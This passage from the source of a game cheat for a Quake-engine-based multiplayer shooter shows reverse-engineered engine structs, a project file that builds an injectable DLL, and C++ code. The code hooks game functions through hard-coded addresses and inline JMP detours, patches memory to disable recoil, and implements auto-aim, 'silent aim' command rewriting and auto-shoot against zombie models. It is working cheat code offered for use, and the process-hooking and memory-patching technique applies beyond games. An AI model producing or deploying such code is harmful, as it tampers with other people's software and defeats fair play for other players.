    trajectory_t	pos;
    trajectory_t	apos;

    int				pad[ 8 ];

    int				otherEntityNum;
    int				otherEntityNum2;

    int				pad4[ 5 ];

    int				clientNum;

    int				pad2[ 2 ];

    int				solid;
    int				eventParm;

    int				pad5[ 9 ];

    int				weapon;
    int				legsAnim;
    int				torsoAnim;

    int				pad3[ 7 ];
} entityState_t; //size=240, dw=60

typedef struct
{
    entityState_t	currentState;
    entityState_t	nextState;
    qbool			currentValid;
    int				pad[ 2 ];
    vec3_t			lerpOrigin;
    vec3_t			lerpAngles;
    int				pad2[ 8 ];
} centity_t; //size=548, dw=137

typedef struct
{
    int			ServerTime;
    int			Buttons;
    byte		weapon;
    char		pad1[ 3 ];
    int			ViewAngle[ 3 ];
    byte		forwardmove;
    byte		rightmove;
    char		pad2[ 2 ];
} userCmd_t; //Size=28, dw=1C

typedef struct
{
    userCmd_t usercmds[ 128 ];
    int currentCmdNum;
    userCmd_t *GetUserCmd( int cmdNum )
    {
        int id = cmdNum & 0x7F;
        return &usercmds[ id ];
    }
} input_t;

typedef struct
{
    int				x;
    int				y;
    int				width;
    int				height;
    float			fov_x;
    float			fov_y;
    vec3_t			vieworg;
    vec3_t			viewaxis[ 3 ];
    int				time;
    int				rdflags;
    BYTE			areamask[ 8 ]; //?
} refdef_t; //size=88, dw=22

typedef struct
{
    int			commandTime;	// cmd->serverTime of last executed command
    int			pm_type;
    int			bobCycle;		// for view bobbing and footstep generation
    int			pm_flags;		// ducked, jump_held, etc
    int			pm_time;
    vec3_t		origin;
    vec3_t		velocity;

    int			padding00[ 31 ];

    int			clientNum;

    int			pading01[ 2422 ];
} playerState_t; //size=10404, dw=2465

typedef struct
{
    int				padding00[ 12 ];

    playerState_t	ps;
    int				numEntities;

    int				padding01;

    entityState_t	entities[ 256 ];
} snapshot_t;

typedef struct
{
    int				clientFrame;
    int				clientNum;

    int				padding01[ 7 ];

    snapshot_t *	snap;
    snapshot_t *	nextSnap;

    int				padding02[ 57 ];

    int				sight;

    int				padding03[ 38566 ];

    int				frametime;
    int				time;

    int				padding05[ 4 ];

    playerState_t	predictedPlayerState;

    int				padding5[ 202 ];

    //41308
    refdef_t		refdef; //22
    vec3_t			refdefViewAngles;

    int				padding2[ 3582 ];
    int				crosshairClientNum;
    int				crosshairClientTime;
    int				padding3[ 3 ];
    int				crosshairClientHealth; //?
    int				padding4[ 173 ];

    vec3_t			kick_angles;
    int				padding1[ 205375 ];

    //int				padding1[209139];
} cg_t; //size=1001888, dw=250472
```

`Esp & Aim/hack.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{4CF27B4B-B6A0-4A2D-8569-770930FD3848}</ProjectGuid>
    <RootNamespace>hack</RootNamespace>
    <WindowsTargetPlatformVersion>8.1</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140_xp</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v140</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>$(SolutionDir)bin\</OutDir>
    <IntDir>tmp\</IntDir>
    <TargetName>ZBH</TargetName>
    <TargetExt>.asi</TargetExt>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <ImageHasSafeExceptionHandlers>false</ImageHasSafeExceptionHandlers>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="aimbot.cpp" />
    <ClCompile Include="cDraw.cpp" />
    <ClCompile Include="dllmain.cpp" />
    <ClCompile Include="dvar.cpp" />
    <ClCompile Include="math.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="aimbot.h" />
    <ClInclude Include="dllmain.h" />
    <ClInclude Include="dvar.h" />
    <ClInclude Include="engine.h" />
    <ClInclude Include="math.h" />
    <ClInclude Include="memhack.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="types.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Esp & Aim/hack.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClCompile Include="dllmain.cpp" />
    <ClCompile Include="math.cpp" />
    <ClCompile Include="aimbot.cpp" />
    <ClCompile Include="cDraw.cpp" />
    <ClCompile Include="dvar.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="dllmain.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="math.h" />
    <ClInclude Include="engine.h" />
    <ClInclude Include="types.h" />
    <ClInclude Include="aimbot.h" />
    <ClInclude Include="dvar.h" />
    <ClInclude Include="memhack.h" />
  </ItemGroup>
</Project>
```

`Esp & Aim/main.cpp`:

```cpp
// =====================================================
// Header
// =====================================================
#include <Windows.h>
#include <string>
#include <vector>
#include <algorithm>
#include <cmath>

#define KEY_DOWN(vk_code) ((GetAsyncKeyState(vk_code) & 0x8000) ? 1 : 0)

#define VectorCopy(a,b)			((b)[0]=(a)[0],(b)[1]=(a)[1],(b)[2]=(a)[2])
#define VectorSub(a,b,c)		((c)[0]=(a)[0]-(b)[0],(c)[1]=(a)[1]-(b)[1],(c)[2]=(a)[2]-(b)[2])
#define RAD2DEG( a )			( ( (a) * 180.0f ) / M_PI )

#define	PITCH					0		// up / down
#define	YAW						1		// left / right
#define	ROLL					2		// fall over
#define M_PI					3.14159265358979323846f
#define	ANGLE2SHORT(x)			((int)((x)*65536/360) & 65535)

#define	MASK_SHOT				(0x02802091)//(CONTENTS_SOLID|CONTENTS_BODY|CONTENTS_CORPSE)
#define RT_MODEL				0

#define CG_Trace ( ( int( *)( trace_t *result, const vec3_t start, const vec3_t mins, const vec3_t maxs, const vec3_t end, int skipNumber, int mask ) )0x004DE690 )
#define RegisterEnum ( ( dvar_t * ( * )( const char * var_name, enum_type enum_values[], int initial, int flags ) )0x004383A0 )
#define CmdConsole  ( ( void (*)( char * ) )0x004214C0 )

typedef float vec3_t[ 3 ];
typedef int qhandle_t;
typedef int qbool;
typedef const char *enum_type;

typedef struct
{
    float		fraction;
    int			pad1[ 9 ];
} trace_t;

typedef struct
{
    int reType;
    int pad1[ 14 ];
    vec3_t origin;
    int pad2[ 11 ];
} refEntity_t;

typedef struct
{
    int render[ 7 ];
    qhandle_t *model;
    int pad2[ 11 ];
    vec3_t point1;
    vec3_t point2;
    int pad3[ 5 ];
} shaderInfo_t;

typedef struct
{
    int ServerTime;
    int Buttons;
    byte weapon;
    char pad1[ 3 ];
    int ViewAngle[ 3 ];
    byte forwardmove;
    byte rightmove;
    char pad2[ 2 ];
} userCmd_t; //Size=28, dw=1C

typedef struct
{
    userCmd_t usercmds[ 128 ];
    int currentCmdNum;
    userCmd_t *GetUserCmd( int cmdNum )
    {
        int id = cmdNum & 0x7F;
        return &usercmds[ id ];
    }
} input_t;

typedef struct
{
    int pad0[ 6 ];
    vec3_t vieworg;
    int pas1[ 13 ];
} refdef_t;

typedef struct
{
    int padding00[ 42 ];
    int clientNum;
    int pading01[ 2422 ];
} playerState_t;

typedef struct
{
    int padding00[ 12 ];
    playerState_t	ps;
    int	entities[ 61442 ];
} snapshot_t;

typedef struct
{
    int padding01[ 9 ];
    snapshot_t * snap;
    int padding03[ 38631 ];
    playerState_t predictedPlayerState;
    int padding5[ 202 ];
    refdef_t refdef; //22
    vec3_t refdefViewAngles;
    int padding4[ 209139 ];
} cg_t;

typedef struct
{
    refEntity_t * ent;
    shaderInfo_t * si;
    bool visible;
    int fov_x;
    int fov_y;
    float distance;
    vec3_t aimangles;
} BotTarget_t;

typedef struct
{
    refEntity_t ent;
    shaderInfo_t si;
} model_t;

typedef struct
{
    const char *	name;
    int				flags;
    //LPVOID		value;
    union
    {
        float		fValue;
        float *		pVectorValue;
        int			iValue;
        ULONG		ulValue;
        char *		pStringValue;
        bool		boolValue;
    };
    LPVOID			value2;
    LPVOID			value3;
    LPVOID			min;
    LPVOID			max;
    int				pad[ 2 ];
} dvar_t;

typedef struct
{
    DWORD gfx_dll;
    float *viewangles;
    cg_t *cg;
    input_t *input;
    bool Aimkeypress;
    bool Shoot;
} set_t;

typedef void( *oStereoFrame ) ( );
typedef int( WINAPIV *t_AddRefEntityToScene )( refEntity_t * ent, shaderInfo_t * si, int * cent );

class cAimbot
{
private:
    static bool     SortMinDist( BotTarget_t lhs, BotTarget_t rhs );
    static bool     SortMaxDist( BotTarget_t lhs, BotTarget_t rhs );
    static bool     SortMinFov( BotTarget_t lhs, BotTarget_t rhs );

    void            SilentAim( int num_zombie );
    void            AutoAim();

    vec3_t          aimangles;
    bool            findzom;
public:
    void            AddZombie( refEntity_t * ent, shaderInfo_t * si );
    int             GetFirstZombie();
    void            Aiming( int num_zombie );
};

// =====================================================
// Source
// =====================================================
set_t set;
oStereoFrame pStereoFrame;
t_AddRefEntityToScene o_AddRefEntityToScene;

enum_type aimtype[] = { "Off", "Auto aim", "Silent aim", NULL };
enum_type aimkey[] = { "Off", "Left mouse", "Right Mouse", "Shift", "Alt", NULL };
enum_type aimfilter[] = { "Min distance", "Max distance", "Min FOV", NULL };

vec3_t vec3_origin = { 0.0f, 0.0f, 0.0f };

dvar_t *dv_aimbot;
dvar_t *dv_aimbot_fov;
dvar_t *dv_aimbot_key;
dvar_t *dv_aimbot_filter;
dvar_t *dv_aimbot_norecoil;
dvar_t *dv_aimbot_autoshoot;

cAimbot aim;
std::vector<BotTarget_t> Targets;
std::vector<model_t> models;

char *zombie_list[] = {
	"iwx_nazi",
	"wolfrun",
	"wolfattack",
	"horrortulajdona_pssf",
	"horror_arab_rotu",
	"horror_rotu",
	"horror_bigblood",
	"inak_dog",
	"oma_diana2",
	"oma_zombie",
	"oma_zom_cellbreaker",
	"van_mon",
	NULL
};

// =====================================================
// Memory
// =====================================================
static void MemoryWrite( void *adr, void *ptr, int size )
{
	DWORD OldProtection;
	VirtualProtect( adr, size, PAGE_EXECUTE_READWRITE, &OldProtection );
	memcpy( adr, ptr, size );
	VirtualProtect( adr, size, OldProtection, &OldProtection );
}

static void * DetourCreate( BYTE *src, const BYTE *dst, const int len )
{
	BYTE *jmp = (BYTE*)malloc( len + 5 );
	DWORD dwback;

	VirtualProtect( src, len, PAGE_READWRITE, &dwback );

	memcpy( jmp, src, len ); jmp += len;

	jmp[ 0 ] = 0xE9;
	*(DWORD*)( jmp + 1 ) = (DWORD)( src + len - jmp ) - 5;

	src[ 0 ] = 0xE9;
	*(DWORD*)( src + 1 ) = (DWORD)( dst - src ) - 5;

	VirtualProtect( src, len, dwback, &dwback );

	return ( jmp - len );
}

// =====================================================
// Dvars
// =====================================================
dvar_t * Dvar_FindDvar( const char * name )
{
	static dvar_t *dvarList = (dvar_t *)0x00C5C9D0;

	for ( int i = 0; i < 0x500; i++ )
	{
		if ( dvarList[ i ].name )
		{
			if ( _stricmp( dvarList[ i ].name, name ) == 0 )
				return &( dvarList[ i ] );
		}
	}

	return NULL;
}

void register_dvars()
{
	dv_aimbot = RegisterEnum( "zombot_aimbot", aimtype, 0, 0 );
	dv_aimbot_key = RegisterEnum( "zombot_aimkey", aimkey, 0, 0 );
	dv_aimbot_filter = RegisterEnum( "zombot_filter", aimfilter, 0, 0 );

	CmdConsole( "dvar_bool zombot_norecoil 0 " );
	CmdConsole( "dvar_bool zombot_autoshoot 0 " );

	dv_aimbot_norecoil = Dvar_FindDvar( "zombot_norecoil" );
	dv_aimbot_autoshoot = Dvar_FindDvar( "zombot_norecoil" );
}

// =====================================================
// Math
// =====================================================
bool IsVisible( vec3_t point )
{
    trace_t t;

    CG_Trace( &t, set.cg->refdef.vieworg, vec3_origin, vec3_origin, point, set.cg->snap->ps.clientNum, MASK_SHOT );

    return ( t.fraction == 1.0f );
}

float GetDistance( vec3_t origin )
{
    vec3_t vector;

    VectorSub( origin, set.cg->refdef.vieworg, vector );
    return ( sqrt( vector[ 0 ] * vector[ 0 ] + vector[ 1 ] * vector[ 1 ] + vector[ 2 ] * vector[ 2 ] ) / 48 );
}

void vectoangles( const vec3_t value1, vec3_t angles )
{
    float forward, yaw, pitch;

    if ( value1[ 0 ] == 0 && value1[ 1 ] == 0 )
    {
        yaw = 0;

        if ( value1[ 2 ] > 0 )
            pitch = 90;
        else
            pitch = 270;
    }
    else
    {
        if ( value1[ 0 ] )
            yaw = RAD2DEG( atan2( value1[ 1 ], value1[ 0 ] ) );
        else if ( value1[ 1 ] > 0 )
            yaw = 90.0f;
        else
            yaw = 270.0f;

        if ( yaw < 0.0f )
            yaw += 360.0f;

        forward = sqrt( ( value1[ 0 ] * value1[ 0 ] ) + ( value1[ 1 ] * value1[ 1 ] ) );
        pitch = RAD2DEG( atan2( value1[ 2 ], forward ) );

        if ( pitch < 0.0f )
            pitch += 360;
    }

    angles[ PITCH ] = -pitch;
    angles[ YAW ] = yaw;
    angles[ ROLL ] = 0;
}

void GetAngleToOrigin( vec3_t origin, vec3_t angles )
{
    vec3_t entity;
    VectorSub( origin, set.cg->refdef.vieworg, entity );
    vectoangles( entity, angles );

    if ( angles[ PITCH ] > 180.0f )				angles[ PITCH ] -= 360.0f;
    else if ( angles[ PITCH ] < -180.0f )		angles[ PITCH ] += 360.0f;
    if ( angles[ YAW ] > 180.0f )				angles[ YAW ] -= 360.0f;
    else if ( angles[ YAW ] < -180.0f )		angles[ YAW ] += 360.0f;
    angles[ PITCH ] -= set.cg->refdefViewAngles[ PITCH ];
    angles[ YAW ] -= set.cg->refdefViewAngles[ YAW ];
    if ( angles[ PITCH ] > 180.0f )			angles[ PITCH ] -= 360.0f;
    else if ( angles[ PITCH ] < -180.0f )		angles[ PITCH ] += 360.0f;
    if ( angles[ YAW ] > 180.0f )				angles[ YAW ] -= 360.0f;
    else if ( angles[ YAW ] < -180.0f )		angles[ YAW ] += 360.0f;
}

// =====================================================
// Aimbot
// =====================================================
bool cAimbot::SortMinDist( BotTarget_t lhs, BotTarget_t rhs )
{
    return ( lhs.distance < rhs.distance );
}

bool cAimbot::SortMaxDist( BotTarget_t lhs, BotTarget_t rhs )
{
    return ( lhs.distance > rhs.distance );
}

bool cAimbot::SortMinFov( BotTarget_t lhs, BotTarget_t rhs )
{
    float fLHS = ( lhs.aimangles[ 0 ] * lhs.aimangles[ 0 ] ) + ( lhs.aimangles[ 1 ] * lhs.aimangles[ 1 ] );
    float fRHS = ( rhs.aimangles[ 0 ] * rhs.aimangles[ 0 ] ) + ( rhs.aimangles[ 1 ] * rhs.aimangles[ 1 ] );

    return ( fLHS < fRHS );
}

void cAimbot::AddZombie( refEntity_t * ent, shaderInfo_t * si )
{
    BotTarget_t zom;

    zom.ent = ent;
    zom.si = si;

    vec3_t origin;
    VectorCopy( zom.ent->origin, origin );
    origin[ 2 ] += zom.si->point2[ 2 ] - zom.si->point2[ 2 ] / 3;

    GetAngleToOrigin( origin, zom.aimangles );

    zom.distance = GetDistance( origin );

    if ( IsVisible( origin ) )
    {
        zom.visible = true;
        findzom = true;
    }
    else
    {
        zom.visible = false;
    }

    zom.fov_x = (int)fabs( zom.aimangles[ PITCH ] ) * 2;
    zom.fov_y = (int)fabs( zom.aimangles[ YAW ] ) * 2;

    Targets.push_back( zom );
}

int cAimbot::GetFirstZombie()
{
    if ( !dv_aimbot_filter || !findzom )
        return -1;

    switch ( dv_aimbot_filter->iValue )
    {
    case 0: // Min distance
        std::sort( Targets.begin(), Targets.end(), SortMinDist );
        break;
    case 1:	// Max distance
        std::sort( Targets.begin(), Targets.end(), SortMaxDist );
        break;
    case 2: // Min angle
        std::sort( Targets.begin(), Targets.end(), SortMinFov );
        break;
    };

    for ( size_t i = 0; i < Targets.size(); i++ )
    {
        if ( !Targets[ i ].visible )
            continue;

        aimangles[ PITCH ] = Targets[ i ].aimangles[ PITCH ];
        aimangles[ YAW ] = Targets[ i ].aimangles[ YAW ];
        aimangles[ ROLL ] = Targets[ i ].aimangles[ ROLL ];

        return i;
    }

    return -1;
}

void cAimbot::AutoAim()
{
    set.viewangles[ PITCH ] += aimangles[ PITCH ];
    set.viewangles[ YAW ] += aimangles[ YAW ];
    set.viewangles[ ROLL ] += aimangles[ ROLL ];

    if ( dv_aimbot_autoshoot && dv_aimbot_autoshoot->iValue == 1 )
        set.Shoot = true;
}

void cAimbot::SilentAim( int num_player )
{
    userCmd_t *cmd = set.input->GetUserCmd( set.input->currentCmdNum );
    userCmd_t *oldcmd = set.input->GetUserCmd( set.input->currentCmdNum - 1 );
    *oldcmd = *cmd;
    cmd->ServerTime++;
    set.input->currentCmdNum++;

    cmd->ViewAngle[ 0 ] += ANGLE2SHORT( aimangles[ 0 ] );
    cmd->ViewAngle[ 1 ] += ANGLE2SHORT( aimangles[ 1 ] );
    cmd->ViewAngle[ 2 ] += ANGLE2SHORT( aimangles[ 2 ] );

    if ( dv_aimbot_autoshoot && dv_aimbot_autoshoot->iValue == 1 )
        set.Shoot = true;
}

void cAimbot::Aiming( int num_player )
{
    if ( num_player < 0 || !dv_aimbot || dv_aimbot->iValue == 0 )
        return;

    if ( ( dv_aimbot_key->iValue > 0 && set.Aimkeypress ) || !dv_aimbot_key->iValue )
    {
        switch ( dv_aimbot->iValue )
        {
        case 1:
            AutoAim();
            break;
        case 2:
            SilentAim( num_player );
            break;
        }
    }

    Targets.clear();
    findzom = false;
}

// =====================================================
// Detours
// =====================================================
int RE_AddRefEntityToScene( refEntity_t * ent, shaderInfo_t * si, int * cent )
{
    if ( ent->reType == RT_MODEL )
    {
        if ( dv_aimbot && dv_aimbot->iValue > 0 )
        {
            for ( int i = 0; zombie_list[ i ]; i++ )
            {
                if ( strstr( *(char **)( si->model + 2 ), zombie_list[ i ] ) )
                {
                    model_t model;

                    model.ent = *ent;
                    model.si = *si;

                    models.push_back( model );
                }
            }
        }
    }

    return o_AddRefEntityToScene( ent, si, cent );
}

void hStereoFrame()
{
    pStereoFrame();

    if ( set.cg->snap )
    {
        if ( dv_aimbot_norecoil )
        {
            if ( dv_aimbot_norecoil->iValue )
                MemoryWrite( (void*)0x004D7115, ( void* )"\x75", 1 );
            else
                MemoryWrite( (void*)0x004D7115, ( void* )"\x74", 1 );
        }

        if ( dv_aimbot && dv_aimbot->iValue > 0 )
        {
            for ( int i = 0; i < models.size(); i++ )
                aim.AddZombie( &models[ i ].ent, &models[ i ].si );

            int num = aim.GetFirstZombie();
            aim.Aiming( num );
            models.clear();
        }
    }
}

// =====================================================
// Main
// =====================================================
void __stdcall mymain()
{
	while ( GetModuleHandleA( "gfx_d3d_mp_x86_s.dll" ) == 0 || GetModuleHandleA( "mssmp3.asi" ) == 0 || GetModuleHandleA( "d3d9.dll" ) == 0 )
		Sleep( 100 );

	set.gfx_dll = (DWORD)LoadLibraryA( "gfx_d3d_mp_x86_s.dll" );
	set.cg = (cg_t*)0x014EE080;
	set.viewangles = (float *)0x0098FDEC;
	set.input = (input_t *)0x009CFE2C;

	register_dvars();

	o_AddRefEntityToScene = (t_AddRefEntityToScene)DetourCreate( (PBYTE)( set.gfx_dll + 0x241A0 ), (PBYTE)RE_AddRefEntityToScene, 5 );
    pStereoFrame = (oStereoFrame)DetourCreate( (PBYTE)( 0x004CBCA0 ), (PBYTE)hStereoFrame, 8 );
}

void __stdcall KeyHook()
{
	DWORD keys[] = { 0, VK_RBUTTON, VK_LBUTTON, VK_LSHIFT, VK_MENU };

	for ( ;; Sleep( 20 ) )
	{
		if ( dv_aimbot_key && KEY_DOWN( keys[ dv_aimbot_key->iValue ] ) )
			set.Aimkeypress = true;
		else
			set.Aimkeypress = false;

		if ( set.Shoot )
		{
			keybd_event( VK_LBUTTON, 0, 0, 0 );
			keybd_event( VK_LBUTTON, 0, KEYEVENTF_KEYUP, 0 );
			set.Shoot = false;
		}
	}
}

bool __stdcall DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
	switch ( fdwReason )
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls( hinstDLL );

		CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)mymain, NULL, NULL, NULL );
		CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)KeyHook, NULL, NULL, NULL );
		break;
	}

	return true;
}
```

`Esp & Aim/math.cpp`:

```cpp
#include "dllmain.h"

vec3_t vec3_origin = { 0.0f, 0.0f, 0.0f };

int CG_Trace( trace_t *result, const vec3_t start, const vec3_t mins, const vec3_t maxs, const vec3_t end, int skipNumber, int mask )
{
    return ( ( int( *)( trace_t *result, const vec3_t start, const vec3_t mins, const vec3_t maxs, const vec3_t end, int skipNumber, int mask ) )0x004DE690 )( result, start, mins, maxs, end, skipNumber, mask );
}

bool IsVisible( vec3_t point )
{
    trace_t t;

    CG_Trace( &t, set.cg->refdef.vieworg, vec3_origin, vec3_origin, point, set.cg->snap->ps.clientNum, MASK_SHOT );

    return ( t.fraction == 1.0f );
}

float GetDistance( vec3_t origin )
{
    vec3_t vector;

    VectorSub( origin, set.cg->refdef.vieworg, vector );
    return ( sqrt( vector[ 0 ] * vector[ 0 ] + vector[ 1 ] * vector[ 1 ] + vector[ 2 ] * vector[ 2 ] ) / 48 );
}

void vectoangles( const vec3_t value1, vec3_t angles )
{
    float forward, yaw, pitch;

    if ( value1[ 0 ] == 0 && value1[ 1 ] == 0 )
    {
        yaw = 0;

        if ( value1[ 2 ] > 0 )
            pitch = 90;
        else
            pitch = 270;
    }
    else
    {
        if ( value1[ 0 ] )
            yaw = RAD2DEG( atan2( value1[ 1 ], value1[ 0 ] ) );
        else if ( value1[ 1 ] > 0 )
            yaw = 90.0f;
        else
            yaw = 270.0f;

        if ( yaw < 0.0f )
            yaw += 360.0f;

        forward = sqrt( ( value1[ 0 ] * value1[ 0 ] ) + ( value1[ 1 ] * value1[ 1 ] ) );
        pitch = RAD2DEG( atan2( value1[ 2 ], forward ) );

        if ( pitch < 0.0f )
            pitch += 360;
    }

    angles[ PITCH ] = -pitch;
    angles[ YAW ] = yaw;
    angles[ ROLL ] = 0;
}

void GetAngleToOrigin( vec3_t origin, vec3_t angles )
{
    vec3_t entity;
    VectorSubtract( origin, set.cg->refdef.vieworg, entity );
    vectoangles( entity, angles );

    if ( angles[ PITCH ] > 180.0f )				angles[ PITCH ] -= 360.0f;
    else if ( angles[ PITCH ] < -180.0f )		angles[ PITCH ] += 360.0f;
    if ( angles[ YAW ] > 180.0f )				angles[ YAW ] -= 360.0f;
    else if ( angles[ YAW ] < -180.0f )		angles[ YAW ] += 360.0f;
    angles[ PITCH ] -= set.cg->refdefViewAngles[ PITCH ];
    angles[ YAW ] -= set.cg->refdefViewAngles[ YAW ];
    if ( angles[ PITCH ] > 180.0f )			angles[ PITCH ] -= 360.0f;
    else if ( angles[ PITCH ] < -180.0f )		angles[ PITCH ] += 360.0f;
    if ( angles[ YAW ] > 180.0f )				angles[ YAW ] -= 360.0f;
    else if ( angles[ YAW ] < -180.0f )		angles[ YAW ] += 360.0f;
}
```

`Esp & Aim/math.h`:

```h
#pragma once

#define DotProduct(x,y)			((x)[0]*(y)[0]+(x)[1]*(y)[1]+(x)[2]*(y)[2])
#define VectorSubtract(a,b,c)	((c)[0]=(a)[0]-(b)[0],(c)[1]=(a)[1]-(b)[1],(c)[2]=(a)[2]-(b)[2])
#define VectorAdd(a,b,c)		((c)[0]=(a)[0]+(b)[0],(c)[1]=(a)[1]+(b)[1],(c)[2]=(a)[2]+(b)[2])
#define VectorCopy(a,b)			((b)[0]=(a)[0],(b)[1]=(a)[1],(b)[2]=(a)[2])
#define	VectorScale(v, s, o)	((o)[0]=(v)[0]*(s),(o)[1]=(v)[1]*(s),(o)[2]=(v)[2]*(s))
#define	VectorMA(v, s, b, o)	((o)[0]=(v)[0]+(b)[0]*(s),(o)[1]=(v)[1]+(b)[1]*(s),(o)[2]=(v)[2]+(b)[2]*(s))
#define VectorSub(a,b,c)		((c)[0]=(a)[0]-(b)[0],(c)[1]=(a)[1]-(b)[1],(c)[2]=(a)[2]-(b)[2])
#define DEG2RAD( a )			( ( (a) * M_PI ) / 180.0F )
#define RAD2DEG( a )			( ( (a) * 180.0f ) / M_PI )

#define	PITCH					0		// up / down
#define	YAW						1		// left / right
#define	ROLL					2		// fall over
#define M_PI					3.14159265358979323846f
#define M_RADPI					57.295779513082f
#define	ANGLE2SHORT(x)			((int)((x)*65536/360) & 65535)

#define	CONTENTS_SOLID				0x00000001
#define	CONTENTS_LIGHTGRID			0x00000004
#define	CONTENTS_LAVA				0x00000008
